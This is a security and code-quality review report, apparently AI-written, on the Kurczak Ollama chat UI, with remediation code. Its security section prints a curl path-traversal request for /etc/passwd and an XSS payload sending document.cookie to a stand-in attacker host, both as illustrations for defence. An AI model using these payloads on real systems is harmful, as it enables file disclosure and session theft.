# Kurczak Code Review Report

**Project:** Kurczak - Minimal Ollama Chat UI  
**Repository:** https://github.com/c0m4r/kurczak  
**Version tested:** 3.0.0
**Review Date:** February 11, 2026  
**Reviewer:** Kimi K2.5

## Executive Summary

Kurczak is a lightweight, single-user chat interface for Ollama with an innovative File Explorer feature for structured code generation. The codebase demonstrates good separation of concerns between frontend and backend, but contains several security vulnerabilities, performance bottlenecks, and code quality issues that require immediate attention.

**Overall Assessment:**
- **Security:** ⚠️ **High Risk** - Path traversal, XSS, and DoS vulnerabilities present
- **Performance:** ⚠️ **Moderate Concerns** - Inefficient DOM operations, memory leaks, missing caching
- **Code Quality:** ⚠️ **Needs Improvement** - Inconsistent error handling, tight coupling, missing TypeScript
- **Documentation:** ✅ **Good** - Clear README with setup instructions

---

## 1. Security Analysis

### 1.1 Critical: Path Traversal Vulnerability (CVSS: High)

**Location:** `server.js` - History API endpoints

**Issue:** The application constructs file paths using user-controlled input (`req.params.id`) without proper sanitization:

```javascript
// VULNERABLE CODE (server.js:115-118)
app.get('/api/history/:id', (req, res) => {
  const file = join(HISTORY_DIR, `${req.params.id}.json`);
  // ...
});
```

**Attack Vector:** An attacker can access arbitrary files using path traversal sequences:
```bash
curl "http://localhost:1234/api/history/../../../etc/passwd"
```

**Impact:** Unauthorized file read access, potentially exposing sensitive system files.

**Remediation:**
```javascript
// SECURE CODE
import { sanitizeFilename } from './utils/sanitize.js'; // Create this utility

const VALID_ID_REGEX = /^[a-zA-Z0-9_-]+$/;

app.get('/api/history/:id', (req, res) => {
  const id = req.params.id;
  
  // Validate ID format
  if (!VALID_ID_REGEX.test(id)) {
    return res.status(400).json({ error: 'Invalid history ID format' });
  }
  
  const file = join(HISTORY_DIR, `${id}.json`);
  
  // Ensure resolved path is within HISTORY_DIR
  const resolvedPath = resolve(file);
  const resolvedHistoryDir = resolve(HISTORY_DIR);
  
  if (!resolvedPath.startsWith(resolvedHistoryDir)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // ... rest of handler
});
```

### 1.2 High: Cross-Site Scripting (XSS) Vulnerabilities

**Location:** `public/app.js` - Message rendering

**Issue:** The frontend renders markdown content using `innerHTML` without proper sanitization:

```javascript
// VULNERABLE CODE (app.js:renderMarkdown function)
function renderMarkdown(text) {
  const raw = marked.parse(text || '');
  const div = document.createElement('div');
  div.className = 'content';
  div.innerHTML = raw; // ⚠️ XSS risk if model returns malicious HTML
  // ...
}
```

**Attack Vector:** A compromised or malicious model could return:
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

**Impact:** Session hijacking, credential theft, malicious actions on behalf of user.

**Remediation:**
```javascript
// SECURE CODE
import DOMPurify from 'dompurify'; // Add to dependencies

function renderMarkdown(text) {
  const raw = marked.parse(text || '');
  const sanitized = DOMPurify.sanitize(raw, {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'code', 'pre', 'blockquote',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li', 'a', 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td'
    ],
    ALLOWED_ATTR: ['href', 'title', 'src', 'alt', 'class', 'language']
  });
  
  const div = document.createElement('div');
  div.className = 'content';
  div.innerHTML = sanitized;
  // ...
}
```

### 1.3 High: Server-Side Request Forgery (SSRF)

**Location:** `server.js` - Ollama proxy endpoints

**Issue:** The server proxies requests to user-configurable Ollama URLs without validation:

```javascript
// VULNERABLE CODE (server.js:45-50)
app.get('/api/models', async (req, res) => {
  try {
    const r = await fetch(`${OLLAMA_URL}/api/tags`);
    // ...
  }
});
```

**Attack Vector:** If an attacker can modify `config.json` or influence the `ollamaUrl` parameter, they can force the server to make requests to internal services.

**Remediation:**
```javascript
// SECURE CODE
import { URL } from 'url';

const ALLOWED_SCHEMES = ['http:', 'https:'];
const BLOCKED_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0', '::1'];

function validateOllamaUrl(urlString) {
  try {
    const url = new URL(urlString);
    
    if (!ALLOWED_SCHEMES.includes(url.protocol)) {
      throw new Error('Invalid protocol');
    }
    
    // Block internal addresses in production
    if (process.env.NODE_ENV === 'production') {
      const hostname = url.hostname.toLowerCase();
      if (BLOCKED_HOSTS.includes(hostname) || hostname.endsWith('.internal')) {
        throw new Error('Internal addresses not allowed');
      }
    }
    
    return urlString;
  } catch (e) {
    throw new Error('Invalid Ollama URL configuration');
  }
}

// Validate at startup
const OLLAMA_URL = validateOllamaUrl(config.ollamaUrl || 'http://localhost:11434').replace(/\/$/, '');
```

### 1.4 Medium: Denial of Service (DoS)

**Location:** `server.js` - JSON parsing

**Issue:** No limits on request body size beyond Express's default:

```javascript
// CURRENT CODE
app.use(express.json({ limit: '10mb' })); // Better, but could be abused
```

**Additional Issue:** No rate limiting on chat endpoints, allowing brute force or resource exhaustion.

**Remediation:**
```javascript
// SECURE CODE
import rateLimit from 'express-rate-limit';

// Rate limiting
const chatLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 30, // limit each IP to 30 requests per windowMs
  message: { error: 'Too many requests, please try again later' }
});

app.post('/api/chat', chatLimiter, async (req, res) => {
  // ... existing code
});

// Validate message structure
const MAX_MESSAGE_LENGTH = 50000;
const MAX_MESSAGES_COUNT = 100;

app.post('/api/chat', chatLimiter, async (req, res) => {
  const { messages } = req.body;
  
  if (!Array.isArray(messages) || messages.length > MAX_MESSAGES_COUNT) {
    return res.status(400).json({ error: 'Invalid messages format' });
  }
  
  for (const msg of messages) {
    if (msg.content && msg.content.length > MAX_MESSAGE_LENGTH) {
      return res.status(400).json({ error: 'Message too long' });
    }
  }
  
  // ... rest of handler
});
```

### 1.5 Medium: Insecure File Permissions

**Location:** `server.js` - History file creation

**Issue:** Files are created with default permissions, potentially readable by other users on shared systems.

**Remediation:**
```javascript
// SECURE CODE
import { writeFileSync, mkdirSync } from 'fs';
import { chmod } from 'fs/promises';

// Create history directory with restricted permissions
if (!existsSync(HISTORY_DIR)) {
  mkdirSync(HISTORY_DIR, { recursive: true, mode: 0o700 });
}

// When writing files
writeFileSync(file, JSON.stringify(payload, null, 2), { mode: 0o600 });
```

---

## 2. Performance Analysis

### 2.1 Critical: Memory Leak in Streaming Handler

**Location:** `server.js` - Chat streaming endpoint

**Issue:** Event listeners are not properly cleaned up, causing memory leaks:

```javascript
// PROBLEMATIC CODE (server.js:78-95)
req.on('aborted', abortUpstream);
res.on('close', () => {
  if (!res.writableEnded) abortUpstream();
});
// Missing cleanup of these listeners
```

**Remediation:**
```javascript
// OPTIMIZED CODE
app.post('/api/chat', async (req, res) => {
  const controller = new AbortController();
  let upstream = null;
  
  const cleanup = () => {
    if (controller.signal.aborted) return;
    controller.abort();
    if (upstream) {
      upstream.destroy();
      upstream = null;
    }
    req.removeListener('aborted', onReqAborted);
    res.removeListener('close', onResClose);
  };
  
  const onReqAborted = () => cleanup();
  const onResClose = () => {
    if (!res.writableEnded) cleanup();
  };
  
  req.once('aborted', onReqAborted);
  res.once('close', onResClose);
  
  try {
    const r = await fetch(url, {
      // ... config
      signal: controller.signal,
    });
    
    if (!r.ok) {
      cleanup();
      // ... error handling
      return;
    }
    
    upstream = Readable.fromWeb(r.body);
    upstream.once('error', cleanup);
    
    res.setHeader('Content-Type', 'application/x-ndjson');
    upstream.pipe(res);
    
    res.once('finish', cleanup);
  } catch (e) {
    cleanup();
    // ... error handling
  }
});
```

### 2.2 High: Inefficient DOM Operations

**Location:** `public/app.js` - Message rendering

**Issue:** `renderMessages()` clears and rebuilds the entire DOM on every update:

```javascript
// INEFFICIENT CODE (app.js:380-400)
function renderMessages() {
  messagesEl.innerHTML = ''; // Clears everything
  if (state.messages.length === 0) {
    // ... empty state
    return;
  }
  state.messages.forEach((m) => {
    // Rebuilds every message from scratch
    messagesEl.appendChild(buildAssistantMessage(...));
  });
  scrollToBottom();
}
```

**Impact:** O(n²) complexity during streaming, causing UI jank with long conversations.

**Remediation:**
```javascript
// OPTIMIZED CODE - Virtual DOM diffing approach
class MessageListRenderer {
  constructor(container) {
    this.container = container;
    this.messageElements = new Map(); // msgId -> element
  }
  
  render(messages) {
    const currentIds = new Set(this.messageElements.keys());
    const newIds = new Set(messages.map(m => m.id));
    
    // Remove deleted messages
    for (const id of currentIds) {
      if (!newIds.has(id)) {
        const el = this.messageElements.get(id);
        if (el) el.remove();
        this.messageElements.delete(id);
      }
    }
    
    // Add or update messages
    messages.forEach((msg, index) => {
      const existing = this.messageElements.get(msg.id);
      
      if (!existing) {
        // Create new
        const el = msg.role === 'assistant' 
          ? buildAssistantMessage(msg.content, msg.partial, msg)
          : buildUserMessage(msg.content, msg);
        this.container.appendChild(el);
        this.messageElements.set(msg.id, el);
      } else if (msg.partial && msg.role === 'assistant') {
        // Update existing streaming message efficiently
        updateStreamingMessage(existing, msg.content);
      }
      
      // Ensure correct order
      if (this.container.children[index] !== existing) {
        this.container.insertBefore(existing, this.container.children[index]);
      }
    });
  }
}
```

### 2.3 Medium: Missing Response Caching

**Location:** `server.js` - Model info endpoint

**Issue:** Model context length is fetched repeatedly without caching:

```javascript
// CURRENT CODE (app.js:423-435)
function fetchModelContext(model) {
  if (modelContextCache[model] !== undefined) return Promise.resolve(modelContextCache[model]);
  return fetch('/api/model-info?model=' + encodeURIComponent(model))
    // ... fetches every time for uncached models
}
```

**Remediation:**
```javascript
// OPTIMIZED CODE - LRU Cache implementation
class LRUCache {
  constructor(maxSize = 100) {
    this.maxSize = maxSize;
    this.cache = new Map();
  }
  
  get(key) {
    const value = this.cache.get(key);
    if (value !== undefined) {
      // Move to end (most recently used)
      this.cache.delete(key);
      this.cache.set(key, value);
    }
    return value;
  }
  
  set(key, value, ttlMs = 300000) { // 5 minute default TTL
    if (this.cache.size >= this.maxSize) {
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
    this.cache.set(key, { value, expires: Date.now() + ttlMs });
  }
  
  getValid(key) {
    const entry = this.get(key);
    if (!entry) return undefined;
    if (Date.now() > entry.expires) {
      this.cache.delete(key);
      return undefined;
    }
    return entry.value;
  }
}

const modelContextCache = new LRUCache(50);

// Usage
async function fetchModelContext(model) {
  const cached = modelContextCache.getValid(model);
  if (cached !== undefined) return cached;
  
  const ctx = await fetch('/api/model-info?model=' + encodeURIComponent(model))
    .then(r => r.ok ? r.json() : { contextLength: null })
    .then(d => d.contextLength != null ? Number(d.contextLength) : null)
    .catch(() => null);
  
  modelContextCache.set(model, ctx);
  return ctx;
}
```

### 2.4 Medium: Unoptimized Bundle Size

**Location:** `public/index.html`

**Issue:** All dependencies loaded via CDN without version pinning or integrity checks:

```html
<!-- CURRENT -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/marked/15.0.6/marked.min.js"></script>
```

**Remediation:**
```html
<!-- SECURE & OPTIMIZED -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/marked/15.0.6/marked.min.js" 
        integrity="sha384-..." 
        crossorigin="anonymous"></script>
```

Consider bundling with Vite/Rollup for tree-shaking and offline capability.

---

## 3. Code Quality Analysis

### 3.1 Inconsistent Error Handling

**Issue:** Mix of try-catch, .catch(), and unhandled rejections throughout codebase.

**Remediation:** Implement centralized error handling:

```javascript
// errorHandler.js
export class AppError extends Error {
  constructor(message, statusCode = 500, code = 'INTERNAL_ERROR') {
    super(message);
    this.statusCode = statusCode;
    this.code = code;
  }
}

export const asyncHandler = (fn) => (req, res, next) => {
  Promise.resolve(fn(req, res, next)).catch(next);
};

export const errorMiddleware = (err, req, res, next) => {
  console.error('Error:', err);
  
  if (err instanceof AppError) {
    return res.status(err.statusCode).json({
      error: err.message,
      code: err.code
    });
  }
  
  // Don't leak internal errors in production
  const message = process.env.NODE_ENV === 'production' 
    ? 'Internal server error' 
    : err.message;
    
  res.status(500).json({ error: message, code: 'INTERNAL_ERROR' });
};
```

### 3.2 Lack of Input Validation

**Issue:** No schema validation for API inputs.

**Remediation:** Use Zod for runtime validation:

```javascript
import { z } from 'zod';

const ChatRequestSchema = z.object({
  model: z.string().min(1).max(100),
  messages: z.array(z.object({
    role: z.enum(['system', 'user', 'assistant']),
    content: z.string().max(50000)
  })).max(100),
  stream: z.boolean().optional()
});

app.post('/api/chat', async (req, res) => {
  const result = ChatRequestSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ 
      error: 'Invalid request', 
      details: result.error.issues 
    });
  }
  // Use result.data...
});
```

### 3.3 Tight Coupling in Frontend

**Issue:** Global state management scattered throughout app.js.

**Remediation:** Implement proper state management:

```javascript
// store.js
class Store {
  constructor(initialState = {}) {
    this.state = initialState;
    this.listeners = new Set();
  }
  
  subscribe(listener) {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  }
  
  setState(updater) {
    const prevState = this.state;
    this.state = typeof updater === 'function' 
      ? updater(this.state) 
      : { ...this.state, ...updater };
    
    if (this.state !== prevState) {
      this.listeners.forEach(fn => fn(this.state, prevState));
    }
  }
  
  getState() {
    return this.state;
  }
}

// Usage
const store = new Store({
  messages: [],
  currentId: null,
  streaming: false,
  model: ''
});

// Components subscribe to specific slices
store.subscribe((newState, oldState) => {
  if (newState.messages !== oldState.messages) {
    renderMessages(newState.messages);
  }
});
```

### 3.4 Missing Type Safety

**Recommendation:** Migrate to TypeScript for better maintainability:

```typescript
// types.ts
export interface Message {
  id: string;
  role: 'user' | 'assistant' | 'system';
  content: string;
  createdAt: string;
  model?: string;
  genSeconds?: number;
  partial?: boolean;
}

export interface ChatState {
  currentId: string | null;
  model: string;
  messages: Message[];
  streaming: boolean;
  abortController: AbortController | null;
}
```

---

## 4. Prompt & Documentation Review

### 4.1 Prompt Engineering Issues

**Location:** `prompts/coding-complex.md`

**Issues:**
1. **Overly Prescriptive:** The prompt forces a specific workflow that may not suit all use cases
2. **No Error Handling Guidelines:** Doesn't instruct the model how to handle generation failures
3. **Ambiguous File Path Rules:** "Project Root" requirement is inconsistently enforced

**Recommendations:**
```markdown
## ADDITIONAL GUIDELINES

### Error Handling
If you cannot complete a request:
1. Explain why in plain text (outside code blocks)
2. Do NOT output partial or broken code files
3. Suggest alternatives or simplified approaches

### File Size Limits
- Single files should not exceed 500 lines
- Split large modules into logical sub-modules
- Use index files to re-export from directories

### Security Considerations
- Never include hardcoded secrets or API keys
- Sanitize any user input examples
- Use parameterized queries in database examples
```

### 4.2 Documentation Gaps

**Missing Documentation:**
- API endpoint specifications (OpenAPI/Swagger)
- Environment variable reference
- Deployment guide (Docker, reverse proxy)
- Troubleshooting guide
- Contribution guidelines

**Recommendation:** Add `API.md` and `DEPLOYMENT.md`:

```markdown
# API Documentation

## Endpoints

### POST /api/chat
Stream chat completions from Ollama.

**Request Body:**
```json
{
  "model": "llama2",
  "messages": [
    {"role": "user", "content": "Hello"}
  ],
  "stream": true
}
```

**Response:** NDJSON stream of completion chunks
```

---

## 5. Architecture Recommendations

### 5.1 Current Architecture Issues

```
┌─────────────┐     ┌──────────────┐     ┌─────────┐
│   Browser   │────▶│  Express     │────▶│ Ollama  │
│  (app.js)   │◄────│  (server.js) │◄────│         │
└─────────────┘     └──────────────┘     └─────────┘
                           │
                    ┌──────┴──────┐
                    │  Filesystem  │
                    │  (history)   │
                    └──────────────┘
```

**Issues:**
- No authentication/authorization layer
- Direct filesystem access from web layer
- No database (JSON files don't scale)
- Single process architecture

### 5.2 Recommended Architecture

```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐
│   Browser   │────▶│  Nginx       │────▶│  Express    │
│  (React)    │◄────│  (reverse)   │◄────│  API        │
└─────────────┘     └──────────────┘     └──────┬──────┘
                                                │
                    ┌──────────────┐     ┌─────┴─────┐
                    │  PostgreSQL  │◄────│  Service  │
                    │   (history)  │     │   Layer   │
                    └──────────────┘     └─────┬─────┘
                                               │
                                         ┌─────┴─────┐
                                         │  Ollama   │
                                         │  Client   │
                                         └───────────┘
```

---

## 6. Priority Action Items

### Immediate (Security - Fix within 24 hours)
1. [ ] Implement path traversal protection in history endpoints
2. [ ] Add XSS sanitization using DOMPurify
3. [ ] Validate Ollama URL configuration
4. [ ] Add rate limiting to chat endpoints

### High Priority (Performance - Fix within 1 week)
1. [ ] Fix memory leaks in streaming handlers
2. [ ] Implement virtual scrolling for long conversations
3. [ ] Add LRU caching for model metadata
4. [ ] Optimize DOM diffing in message rendering

### Medium Priority (Code Quality - Fix within 1 month)
1. [ ] Migrate to TypeScript
2. [ ] Add comprehensive input validation (Zod)
3. [ ] Implement proper error handling middleware
4. [ ] Add unit and integration tests (Jest/Vitest)
5. [ ] Set up CI/CD pipeline (GitHub Actions)

### Low Priority (Enhancements - Within 3 months)
1. [ ] Add WebSocket support for real-time updates
2. [ ] Implement conversation search
3. [ ] Add export formats (Markdown, PDF)
4. [ ] Create Docker deployment configuration
5. [ ] Add multi-user support with authentication

---

## 7. Conclusion

Kurczak is a functional and feature-rich chat interface with innovative file generation capabilities. However, **the current security vulnerabilities make it unsuitable for production deployment** without immediate remediation. The path traversal and XSS vulnerabilities are particularly concerning as they could lead to complete system compromise.

The codebase would benefit significantly from:
- TypeScript adoption for type safety
- Proper state management (Redux/Zustand)
- Security audit and penetration testing
- Performance profiling and optimization
- Comprehensive test coverage

**Recommendation:** Do not deploy to production until security issues (Section 1) are resolved. Consider this a development/personal-use tool only in its current state.

---

**End of Report**

*This review was conducted based on static code analysis. Dynamic testing and penetration testing are recommended for production readiness certification.*
